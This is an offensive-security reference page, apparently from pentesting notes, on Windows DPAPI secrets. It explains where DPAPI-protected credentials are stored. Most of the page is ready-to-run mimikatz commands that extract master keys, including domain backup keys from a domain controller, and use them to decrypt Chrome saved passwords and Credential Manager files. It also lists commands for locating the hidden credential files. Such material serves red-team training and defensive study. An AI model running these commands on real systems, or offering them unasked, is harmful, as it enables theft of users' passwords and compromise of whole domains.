# DPAPI secrets

## <mark style="color:red;">DPAPI</mark>

The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:

```
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.

#### DPAPI protects the following personal data:

* Passwords and form auto-completion data in Internet Explorer, Google \*Chrome
* E-mail account passwords in Outlook, Windows Mail, Windows Mail, etc.
* Internal FTP manager account passwords
* Shared folders and resources access passwords
* Wireless network account keys and passwords
* Encryption key in Windows CardSpace and Windows Vault
* Remote desktop connection passwords, .NET Passport
* Private keys for Encrypting File System (EFS), encrypting mail S-MIME, other user's certificates, SSL/TLS in Internet Information Services
* EAP/TLS and 802.1x (VPN and WiFi authentication)
* Network passwords in Credential Manager
* Personal data in any application programmatically protected with the API function CryptProtectData. For example, in Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk etc.

Below are common paths of hidden files that usually contain DPAPI-protected data.

```
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

## <mark style="color:red;">Extract a master key</mark>

f you know the password of the user who the master key belongs to and you can access the master key file you can obtain the master key with mimikatz and a command like the following one:

```
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
```

### <mark style="color:orange;">Extract all local Master Keys with Administrator</mark> <a href="#extract-all-local-master-keys-with-administrator" id="extract-all-local-master-keys-with-administrator"></a>

If you are administrator you can obtain the dpapi master keys using:

```
sekurlsa::dpapi
```

### <mark style="color:orange;">Extract all backup Master Keys with Domain Admin</mark> <a href="#extract-all-backup-master-keys-with-domain-admin" id="extract-all-backup-master-keys-with-domain-admin"></a>

A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:

```
lsadump::backupkeys /system:dc01.offense.local /export
```

Using the retrieved backup key, let's decrypt user's `spotless` master key:

```
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```

We can now decrypt user's `spotless` chrome secrets using their decrypted master key:

```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```

### <mark style="color:red;">Credential Files</mark>

The **credentials files protected by the master password** could be located in:

```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:

```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
